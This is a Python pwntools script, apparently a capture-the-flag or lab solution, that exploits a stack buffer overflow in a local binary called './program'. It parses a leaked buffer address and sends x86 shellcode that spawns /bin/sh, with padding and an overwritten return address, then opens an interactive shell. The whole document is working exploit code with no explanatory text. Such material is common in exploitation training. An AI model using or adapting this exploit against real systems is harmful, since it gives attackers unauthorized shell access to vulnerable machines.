#!/usr/bin/env python

from pwn import *

with context.quiet:
    p = process('./program')

    buf_addr = int(p.recvuntil('!').strip().strip('!').split()[-1], 16)
    print 'buffer address: {}'.format(hex(buf_addr))

    shellcode = '\xeb\x0c\x5b\x31\xc9\x31\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00'
    p.sendline(shellcode + 'A' * (0x12A - len(shellcode)) + 'B' * 4 + p32(buf_addr))

    p.interactive()

